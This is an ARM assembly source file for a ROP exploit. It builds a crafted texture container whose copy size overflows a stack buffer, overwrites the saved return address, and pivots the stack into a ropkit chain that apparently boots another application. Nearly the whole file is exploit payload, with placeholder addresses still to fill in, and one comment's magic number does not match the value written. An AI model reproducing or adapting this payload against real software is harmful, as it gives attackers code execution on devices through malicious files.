.arm
.section .init
.global _start

_start:

#define ROPBUF 0x80808080

#define MEMSET32_OTHER 0x90909090

#define ROPKIT_LINEARMEM_REGIONBASE 0x30000000

#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x2000000)

#define TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE 0x50 //Byte-size needed to overwrite data on the stack right before saved LR.

#include "ropkit_ropinclude.s"

.macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
.word POP_R2R6PC
.word 0 @ r2
.word 0 @ r3
.word ROPBUFLOC(pivotdata) @ r4
.word 0 @ r5
.word 0 @ r6
.endm

.macro ROPMACRO_STACKPIVOT_JUMP
.word 0x50505050//STACKPIVOT_ADR
.endm

.word 0x4b505443 @ +0x0 u32: Magicnum 0x13304f6.
.hword 0x1
.hword 0x1 @ Total textures.
.word 0 @ Offset for texture data base.

.space ((_start + 0x20) - .) @ Entry for the first texture, 0x20-bytes per entry.
.word 0, 0, 0, 0, 0
.word (TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE+0x4)>>2 @ u8size, total size to copy in words.
.word 0x40>>2 @ Absolute offset for the srcdataptr, in words.
.word 0

@ Start of the data copied to stack.
.space TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE

@ This is where the initial saved-LR-overwrite is located.
.word 0x40404040

ropstackstart:
#include "ropkit_boototherapp.s"

pivotdata:

stackpivot_sploadword:
.word 0

stackpivot_pcloadword:
.word 0

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, /*STACKPIVOT_ADR*/0x70707070 @ Vtable

